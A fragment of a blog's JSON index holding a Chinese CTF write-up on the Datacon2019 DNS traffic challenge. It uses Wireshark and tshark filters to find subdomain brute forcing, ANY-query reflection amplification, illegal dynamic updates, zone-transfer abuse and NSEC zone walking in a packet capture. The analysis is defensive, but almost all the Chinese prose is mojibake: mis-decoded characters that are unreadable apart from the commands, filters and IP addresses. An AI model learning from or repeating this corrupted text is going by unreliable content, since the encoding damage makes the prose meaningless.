çœ‹äº†å¾ˆå¤šå¤§ä½¬ä»¬å†™çš„Writeupï¼Œç…§è‘«èŠ¦ç”»ç“¢å¤ç°äº†DNSæ¶æ„æµé‡åˆ†æï¼ŒæœŸé—´é‡åˆ°äº†ä¸å°‘çš„å›°éš¾ï¼Œæ¯”å¦‚ï¼š å¯¹DNSåè®®äº†è§£å¾ˆå°‘ æ•°æ®åŒ…éå¸¸å¤§ï¼Œæ²¡æœ‰æ”»å‡»æµé‡çš„æ ‡æ³¨ å¯¹æµé‡åˆ†æåŸºæœ¬æ˜¯é›¶èµ·æ­¥ï¼Œä¸çŸ¥é“è¯¥ä»å“ªé‡Œå¼€å§‹åˆ†æï¼Œæ²¡æœ‰ä¸€ä¸ªåˆç†çš„é€»è¾‘æ€ç»´ ç»è¿‡è¿™ä¸€è½®çš„å¤ç°ä¹‹åï¼Œå¯ä»¥è¯´å¯¹æµé‡åˆ†ææœ‰äº†ä¸€å®šçš„äº†è§£ï¼ŒçŸ¥é“äº†ä¸€äº›DNSçš„æ”»å‡»æ‰‹æ®µä»¥åŠæ”»å‡»ç‰¹å¾ï¼Œè¿˜æœ‰è‹¥å¹²éå¸¸å®ç”¨çš„æ–‡ä»¶å¤„ç†å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œä¾ç„¶å­˜åœ¨å¾ˆå¤šä¸è¶³ï¼Œæ‰€ä»¥æ‰“ç®—ä»¥shyoshyoæ’°å†™çš„Writeupä¸ºæ¨¡æ¿ï¼Œæœ‰æ¡ç†ã€æœ‰é€»è¾‘çš„è¿›è¡Œç¬¬äºŒè½®æµé‡åˆ†æã€‚","tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"http://ca0y1h.top/tags/Wireshark/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"DNS","slug":"DNS","permalink":"http://ca0y1h.top/tags/DNS/"},{"name":"Datacon2019","slug":"Datacon2019","permalink":"http://ca0y1h.top/tags/Datacon2019/"}],"categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"æ¯”èµ›é¢˜","slug":"æµé‡åˆ†æ/æ¯”èµ›é¢˜","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%AF%94%E8%B5%9B%E9%A2%98/"}]},{"title":"Datacon2019-q1-Writeup-v1","date":"2019-07-15T12:44:20.000Z","path":"Web_security/ctf_writeup/1.Datacon2019-q1-Writeup-v1/","text":"Datacon2019-q1-Writeup-v1 è¿™æ˜¯æˆ‘å†™çš„ç¬¬ä¸€ç¯‡åšæ–‡ã€‚ è¿‡å‡ ä¸ªæœˆå°±è¦å»è¯»ç ”äº†ï¼Œæš‘å‡æœŸé—´å¯¼å¸ˆç»™äº†æˆ‘ä»¬ä¸€ä¸ªå°å°çš„ä»»åŠ¡ï¼šå¤ç°2019 Dataconæ¯”èµ›çš„ç¬¬ä¸€é¢˜ã€‚ä¹‹å‰ä»æ¥æ²¡æœ‰æ¥è§¦è¿‡æµé‡åˆ†æç›¸å…³çš„å·¥ä½œï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªå…¨æ–°çš„å¼€å§‹ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹åˆ«äººçš„æ€è·¯å’Œå¤ç°çš„è¿‡ç¨‹ã€‚ é¢˜ç›®è¯´æ˜ é¢˜ç›®èƒŒæ™¯ å‡å¦‚ä½ æ˜¯æŸç½‘ç»œçš„ç®¡ç†å‘˜ï¼Œè¿‘æ—¥æ¥åˆ°å‘Šè­¦ç§°ï¼Œç½‘ç»œä¸­å­˜åœ¨ DNS æ”»å‡»è¡Œä¸ºï¼Œå¸Œæœ›ä½ è¿›è¡Œè°ƒæŸ¥ã€‚ç°æ•è·åˆ°ç½‘ç»œä¸­çš„ DNS æµé‡ï¼Œè¯·å¯¹å…¶ä¸­çš„æ”»å‡»è¡Œä¸ºè¿›è¡Œåˆ†æã€‚ é¢˜ç›®è¦ç‚¹ DNSæ˜¯äº’è”ç½‘ä¸­é‡è¦çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ï¼Œå¯¹ç½‘ç»œçš„ç¨³å®šè¿è¡Œæœ‰è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ç„¶è€Œï¼Œç”±äºè®¾è®¡ç¼ºé™·ï¼ŒDNS å­˜åœ¨è¯¸å¤šè„†å¼±ç‚¹ï¼Œå› æ­¤å¯è¢«åˆ©ç”¨ä¸è¯¸å¤šæ”»å‡»ã€‚æœ¬é¢˜å¯¹å¸¸è§çš„ DNS å®‰å…¨é—®é¢˜è¿›è¡Œè€ƒå¯Ÿã€‚ çŸ¥è¯†å‚¨å¤‡ DNSåè®®åŠæŠ¥æ–‡æ ¼å¼ è¿™ç¯‡æ–‡ç« å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚ åŸŸåå±‚æ¬¡ç»“æ„ åŸŸåæœåŠ¡å™¨ å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚ åŸŸåè§£æè¿‡ç¨‹ ä»¥æŸ¥è¯¢jocent.meä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢ â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meçš„IPåœ°å€ â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meè¿›è¡ŒæŸ¥è¯¢ â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨dns.jocent.meçš„IPåœ°å€ â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨dns.jocent.meè¿›è¡ŒæŸ¥è¯¢ â‘¦æƒé™æœåŠ¡å™¨dns.jocent.meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€ â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90 å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢: é€’å½’æŸ¥è¯¢ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚ è¿­ä»£æŸ¥è¯¢ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚ æŠ¥æ–‡æ ¼å¼ DNSèµ„æºè®°å½•ANYç±»å‹ ä¸ºä»€ä¹ˆåœ¨DDOSæ–¹æ³•æ”»å‡»çš„æ—¶å€™éœ€è¦æŒ‡å®šANYç±»å‹å‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨digå‘½ä»¤æ¥çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µï¼š å¯ä»¥çœ‹åˆ°ï¼ŒDNSæœåŠ¡å™¨è¿”å›äº†è¯¥æœåŠ¡å™¨ä¸­æ‰€æœ‰å…³äº163.comçš„èµ„æºè®°å½•ï¼ŒåŒ…æ‹¬ç±»å‹Aï¼ŒNSï¼ŒMXï¼ŒTXTï¼Œè¿™æ ·å°±ä½¿å¾—å“åº”æ•°æ®åŒ…è¿œè¿œå¤§äºè¯·æ±‚æ•°æ®åŒ…ã€‚ æˆ‘ä»¬ä¸å¦¨å†å¾€æ·±å±‚æ¬¡æƒ³ä¸€æƒ³ï¼Œå·²çŸ¥UDPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´å½“DNSå“åº”æ•°æ®å¤§äº512å­—èŠ‚çš„æ—¶å€™ï¼Œæ•°æ®åªè¿”å›512å­—èŠ‚ï¼Œå‰©ä½™çš„æ•°æ®å°†è¢«ä¸¢å¼ƒã€‚ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªåœ°æ–¹DNSçš„å“åº”æ•°æ®å¯ä»¥è¿”å›å¤§äº2000å­—èŠ‚çš„æ•°æ®å‘¢ï¼Ÿå¯ä»¥å»æŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­çš„Additional Recordsæœ‰ä¸€æ¡OPTç±»å‹çš„èµ„æºè®°å½•ï¼ŒOPTç±»å‹æ˜¯ä¸€ç§ä¸€ä¸ªâ€œä¼ª DNSè®°å½•ç±»å‹â€ä»¥æ”¯æŒ EDNSåè®®ï¼Œå…¶ä¸­UDP Payload Sizeå­—æ®µå¯ä»¥æŒ‡å®šDNSè¿”å›æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ã€‚è¿™é‡Œå¯¹EDNSæœ‰æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šã€‚ DNSæ”»å‡»ç±»å‹ è¿™é‡Œæœ‰å¯¹DNSçš„å„ç§æ”»å‡»ç±»å‹çš„ä»‹ç»ã€‚ dns.flags.optå¸¸è§çš„å€¼ dns.flags.opcode=0(åªæ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=1(åªæ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=2(åªæ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯) dns.flags.opcode=5(åªæ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ï¼‰ DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA NSå’ŒSOAçš„åŒºåˆ« SOAï¼Œå³Start Of Authorityï¼Œæ”¾åœ¨ zone file ä¸­ï¼Œç”¨äºæè¿°è¿™ä¸ª zone è´Ÿè´£çš„ name serverï¼Œversion numberâ€¦ç­‰èµ„æ–™ï¼Œä»¥åŠå½“ slave server è¦å¤‡ä»½è¿™ä¸ª zone æ—¶çš„ä¸€äº›å‚æ•°ã€‚æ¯ä¸ª zone file ä¸­å¿…é¡»æœ‰ä¸”ä»…æœ‰ä¸€æ¡ SOARR ï¼Œå¹¶åœ¨ zone file ä¸­ä½œä¸ºç¬¬ä¸€æ¡èµ„æºè®°å½•ä¿å­˜ã€‚ DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR AXFRï¼ˆå®Œå…¨åŒºåŸŸä¼ è¾“ 252ï¼‰ï¼šç”±ä¸»åŸŸåæœåŠ¡å™¨è½¬ç§»æ•´ä¸ªåŒºåŸŸæ–‡ä»¶è‡³è¾…åŠ©åŸŸåæœåŠ¡å™¨ã€‚ IXFRï¼ˆå¢é‡åŒºåŸŸä¼ è¾“ 251ï¼‰ï¼šè¯·æ±‚åªæœ‰ä¸å…ˆå‰æµæ°´å¼ç¼–å·ä¸åŒçš„ç‰¹å®šåŒºåŸŸçš„åŒºåŸŸè½¬ç§»ã€‚æ­¤è¯·æ±‚æœ‰æœºä¼šè¢«æ‹’ç»ï¼Œå¦‚æœæƒå¨æœåŠ¡å™¨ç”±äºé…ç½®æˆ–ç¼ºä¹å¿…è¦çš„æ•°æ®è€Œæ— æ³•å±¥è¡Œè¯·æ±‚ï¼Œä¸€ä¸ªå®Œæ•´çš„ï¼ˆAXFRï¼‰ä¼šè¢«å‘é€ä»¥ä½œå›åº”ã€‚ è¯¦ç»†ä»‹ç» DNSSECåè®® æµ…è°ˆDNSåŸŸåå®‰å…¨æ‰©å±•åè®®DNSSEC è§£é¢˜è¿‡ç¨‹ å­åŸŸåçˆ†ç ´æ”»å‡» æ”»å‡»åŸç† é“¾æ¥](https://www.secpulse.com/archives/55823.html) å‘ç°è¿‡ç¨‹ é¦–å…ˆï¼Œç”¨ Wireshark æ‰“å¼€ pcap åŒ…ï¼Œç»˜åˆ¶ IO Graphsï¼š å¯è§ï¼Œåœ¨ 5500 - 6000s ä¸­å‡ºç°äº†å¼‚å¸¸çš„å³°å€¼æµé‡ï¼Œå°†5500såˆ°6000sæ‰€æœ‰è¯·æ±‚ã€å“åº”æå–åˆ°æ–°çš„ pcapæ–‡ä»¶ã€‚ æ¥ä¸‹æ¥ä½¿ç”¨ åè®®åˆ†çº§ æŸ¥çœ‹å“ªäº›åè®®å æ¯”æœ€å¤šï¼š å¯ä»¥çœ‹åˆ°ï¼Œåˆ‡å‡ºæ¥çš„åŒ…é‡Œé¢ä»…æœ‰DNSåè®®ï¼Œè€Œä¸”ç”¨æˆ·ä¸»åŠ¨å‘é€çš„æ•°æ®åŒ…å æ¯”æœ€å¤§ã€‚ æŸ¥çœ‹åˆ†ç»„é•¿åº¦ é•¿åº¦ä¸º1280~2559å­—èŠ‚çš„æ•°æ®åŒ…é€šå¸¸è¡¨ç¤ºæ•°æ®ä¼ è¾“ï¼Œé•¿åº¦è¾ƒå°çš„æ•°æ®åŒ…åˆ™è¡¨ç¤ºåè®®æ§åˆ¶åºåˆ— ä»¥è¯·æ±‚æ•°é‡ä»é«˜åˆ°ä½çš„ IP åœ°å€è¿›è¡Œæ’åºã€‚ æ–¹æ³•ä¸€(é€Ÿåº¦å¾ˆæ…¢)ï¼š ä½¿ç”¨wiresharkçš„ç»Ÿè®¡åŠŸèƒ½ï¼Œå¹¶ä¸”ç”¨dns.flags.response == 0è¿›è¡Œç­›é€‰(åªçœ‹DNSæŸ¥è¯¢æŠ¥æ–‡)ï¼š æ–¹æ³•äºŒï¼š ä½¿ç”¨tsharkå‘½ä»¤è¡Œè¿›è¡Œç­›é€‰tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\\t&quot; &quot;\\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt å‚æ•°è§£é‡Šï¼š -r æŒ‡å®šç›®æ ‡æ–‡ä»¶ -Y æŒ‡å®šè¿‡æ»¤è§„åˆ™ -T pdml|ps|text|fields|psml,è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtext -e å¦‚æœ-T fieldsé€‰é¡¹æŒ‡å®šï¼Œ-eç”¨æ¥æŒ‡å®šè¾“å‡ºå“ªäº›å­—æ®µ é¦–å…ˆæŸ¥çœ‹ç¬¬ä¸€ä¸ªIP 45.80.170.1ï¼š å¯ä»¥çœ‹åˆ°è¿™ä¸ªIPåœ°å€æ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚ å†æ¥æŸ¥çœ‹ç¬¬äºŒä¸ªIP 144.202.64.226ï¼š 144.202.64.226 å‘èµ·äº†å¤§é‡é’ˆå¯¹b0e.com.cnåŸŸåçš„æŸ¥è¯¢è¯·æ±‚ï¼Œä¸”å¤§éƒ¨åˆ†ç›¸åº”ç»“æœå‡ä¸º No such nameï¼Œå› æ­¤åˆ¤æ–­æ­¤ç±»æ”»å‡»ä¸ºå­åŸŸåçˆ†ç ´æ”»å‡»ã€‚ é€šè¿‡è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°ï¼Œå‰ 10 ä¸ªè¯·æ±‚å¹¶ä¸æ˜¯åŸŸåçˆ†ç ´æ”»å‡»ï¼Œå»æ‰è¯¥ 10 ä¸ªè¯·æ±‚åï¼Œç¬¬ä¸€ç±»æ”»å‡»å…±æœ‰ 34184 ä¸ªã€‚ DDOSåå°„æ”¾å¤§æ”»å‡» æ”»å‡»åŸç† æµé‡æ”¾å¤§ï¼šåˆ©ç”¨å›å¤åŒ…æ¯”è¯·æ±‚åŒ…å¤§çš„ç‰¹ç‚¹ åœ°å€ä¼ªé€ ï¼šä¼ªé€ è¯·æ±‚åŒ…çš„æºåœ°å€ä¸ºæ”»å‡»ç›®æ ‡ åˆ†å¸ƒå¼ï¼šå¤šä¸ª DNS åŒæ—¶å‘æ”»å‡»ç›®æ ‡è¿”å›å¤§é‡å“åº” æ”»å‡»ç‰¹å¾ é€šè¿‡é€’å½’æŸ¥è¯¢ä»è€Œæ”¾å¤§æµé‡ï¼Œå› æ­¤recursion=1ï¼ŒANYå‚æ•°ï¼ˆä¸ºä»€ä¹ˆå¿…é¡»æ˜¯ANYå‚æ•°ï¼‰ã€‚ è¦æ±‚è¿”å›åŒ…è¿œè¿œå¤§äºå‘é€åŒ…ï¼Œä¸€èˆ¬è¿”å›åŒ…çš„è¦æ±‚å¤§äº3000ã€‚å³dns.rr.udp_payload_size&gt;=3000ã€‚ å‘ç°è¿‡ç¨‹ é€šè¿‡æ”»å‡»ç‰¹å¾å¯ä»¥å¾—å‡ºç­›é€‰æ¡ä»¶dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000ï¼Œå†å¯¹ç­›é€‰åçš„IPåœ°å€è¿›è¡Œç»Ÿè®¡ï¼štshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more è¿™æ ·å°±è¿‡æ»¤å‡ºäº† DNS æœåŠ¡å“åº”æ•°æ®äº†ï¼Œä¸€å…±æœ‰188.141.167.218ï¼Œ187.199.129.12ï¼Œ70.85.232.160ï¼Œ45.80.170.1å››ä¸ªDNSæœåŠ¡å™¨ï¼Œæ¥ç€æ’é™¤ä¸æ”¯æŒ ANY çš„ DNS æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯ Refusedï¼š æ’æŸ¥ä¹‹åï¼Œå¯çŸ¥æ”»å‡»IPï¼ˆä¹Ÿå°±æ˜¯æ’é™¤ç›®çš„IPä¸º45.80.170.1çš„æºIPï¼‰ï¼š127.130.104.152ï¼Œ175.222.102.169ï¼Œ105.191.150.205ã€‚ éæ³•DNS åŠ¨æ€æ›´æ–°æ”»å‡» æ”»å‡»åŸç† è¿™é‡Œå¯¹DNS Dynamic Updateæœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ã€‚ç®€å•åœ°æ¥è¯´ï¼ŒDNS å®¢æˆ·ç«¯åœ¨ IP åœ°å€æˆ–åç§°å‡ºç°æ›´æ”¹çš„ä»»ä½•æ—¶å€™éƒ½å¯åˆ©ç”¨ DNS æœåŠ¡å™¨æ¥æ³¨å†Œå’ŒåŠ¨æ€æ›´æ–°å…¶èµ„æºè®°å½•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ IP æ¬ºéª—ä¼ªè£…æˆ DNS æœåŠ¡å™¨ä¿¡ä»»çš„ä¸»æœºå¯¹åŒºæ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ã€‚ æ”»å‡»ç‰¹å¾ï¼š dns.flags.opt==5æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ å‘ç°è¿‡ç¨‹ ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰ï¼štshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å››ä¸ªæ”»å‡»IPï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535 éæ³•DNSåŸŸä¼ è¾“æ”»å‡» æ”»å‡»åŸç† è¾… DNS æœåŠ¡å™¨ï¼Œéœ€è¦ä¸ä¸» DNS æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼ŒåŠ è½½æ•°æ®ä¿¡æ¯ï¼Œç§°ä¸ºåŒºåŸŸä¼ é€ï¼ˆZone Transferï¼‰ã€‚AXFR è¯·æ±‚ï¼Œå¸¸å¯¼è‡´å…¨åŒºåŸŸä¼ é€ï¼Œéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´ä¸å¸¦å®½ã€‚ å¤§é‡çš„ AXFR ã€IXFRè¯·æ±‚ï¼Œå¯å¯¼è‡´ DDoSã€‚æƒé™é…ç½®ä¸å½“ï¼Œå¯å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼ˆæµ‹è¯•åŸŸåã€å†…éƒ¨åŸŸåï¼‰ã€‚ æ”»å‡»ç‰¹å¾ dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251 å‘ç°è¿‡ç¨‹ æˆ‘ä»¬ç”¨è¿‡æ»¤å™¨dns.qry.type in &#123;251 252&#125;æŠŠAXFRå’ŒIXFRè¿‡æ»¤å‡ºæ¥ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›ç–‘ä¼¼æ”»å‡»IP æœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚ä»”ç»†æ£€æŸ¥ä¸€ä¸‹å‰ä¸¤ä¸ªIPåœ°å€çš„æ•°æ®åŒ…åï¼Œæˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œ è€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ DNSSec NSec åŸŸåéå†æ”»å‡» æ”»å‡»åŸç† DNSSecçš„æ¦‚å¿µä¸ä½œç”¨ NSECï¼šWalking a DNS zone NSECæšä¸¾è¿™æ˜¯é’ˆå¯¹DNSSECçš„ä¸€ç§æ”»å‡»ï¼Œåœ¨æœªä½¿ç”¨NSEC3çš„DNSSECä¸­ï¼Œè‹¥æŸ¥è¯¢åŒºæ–‡ä»¶ä¸­ä¸å­˜åœ¨çš„åŸŸåï¼Œä¼šä»¥NSECè®°å½•çš„å½¢å¼æä¾›é è¿‘å…¶çš„æœ€è¿‘çš„ä¸‹ä¸€æ¡åŸŸåï¼Œè¿™å°±é€ æˆäº†å¯èƒ½æ„é€ ç‰¹æ®Šè¯·æ±‚ï¼Œæ¥éå†åŒºæ–‡ä»¶ï¼Œé€ æˆåŒºæ–‡ä»¶çš„æ³„éœ²ã€‚ æ”»å‡»ç‰¹å¾ åŸŸåéå†æ”»å‡»ä¾èµ–äºNSecèµ„æºè®°å½•ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨``dns.resp.type==47`è¿›è¡Œåˆæ­¥ç­›é€‰ å‘ç°è¿‡ç¨‹ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠŠANYåå°„å‹Dosæ”»å‡»ä¹Ÿç­›é€‰å‡ºæ¥äº†ï¼Œäºæ˜¯å†åŠ ä¸Šnot dns.qry.type==255æ¡ä»¶å°±å¯ä»¥å¾—åˆ°DNSSec NSec åŸŸåéå†æ”»å‡»IPï¼š6.116.183.244 Q&amp;A pacpåŒ…æ–‡ä»¶è¿‡å¤§ï¼ŒWiresharkåŠ è½½å¤±è´¥ è§£å†³åŠæ³•ï¼šä½¿ç”¨ editcap -c &lt;packets per file&gt; åŸå§‹æ–‡ä»¶.pcap è¾“å‡ºæ–‡ä»¶.pcap å‘½ä»¤ï¼›æˆ–è€…ä½¿ç”¨tcpdump -r old_file -w new_files -C 10ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶çš„å¤§å°æ˜¯10 millionå­—èŠ‚ã€‚ bashç®¡é“æ ¼å¼åŒ–è¾“å‡ºå‘½ä»¤ tr sort -nc sort | uniq -c awk more wc å‡ ä¸ªç»å¸¸ç”¨åˆ°çš„DNSæ˜¾ç¤ºè¿‡æ»¤å™¨çš„å®ä¾‹ dns.flags.response=0(DNSæŸ¥è¯¢æ¶ˆæ¯) dns.flags.response=1(DNSå“åº”æ¶ˆæ¯) dns.flags.rcode=0(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º0(Noerror)çš„DNSåº”ç­”æ¶ˆæ¯) dns.flags.rcode=3(æ˜¾ç¤ºRCODEå­—æ®µå€¼ä¸º3(NXDomain,è¡¨ç¤ºåŸŸåä¸å­˜åœ¨)çš„DNSåº”ç­”æ¶ˆæ¯) dns.flags.opcode=0(æ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=1(æ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯) dns.flags.opcode=2(æ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯) dns.flags.opcode=5(æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯) dns.flags.recdesired=1(RDæ ‡è®°ä½ç½®1çš„DNSæŸ¥è¯¢æ¶ˆæ¯ä¸€èˆ¬ä¸ºä¸»æœºå‘å‡ºï¼Œç›®çš„æ˜¯è¦æ±‚æ¥å—è¯¥æ¶ˆæ¯çš„DNSæœåŠ¡å™¨æ‰§è¡Œé€’å½’æŸ¥è¯¢) dns.flags.recdesired=0(æ˜¾ç¤ºRDæ ‡è®°ä½ç½®0çš„DNSé€’å½’åå¤æŸ¥è¯¢åŠå“åº”æ¶ˆæ¯) å¸¸ç”¨çš„æŸ¥è¯¢å­—æ®µ å­—æ®µ æè¿° å­—æ®µ æè¿° frame.len æ•°æ®é•¿åº¦ dns.flags.authenticated æœåŠ¡å™¨æ˜¯å¦ä¸ºåŸŸæƒå¨æœåŠ¡å™¨ ip.src æºIP dns.flags.checkisable éè®¤è¯æ•°æ®æ˜¯å¦å¯æ¥æ”¶ ip.dst ç›®çš„IP dns.flags.rcode DNS reply code udp.srcport æºudpç«¯å£å· dns.count.quires 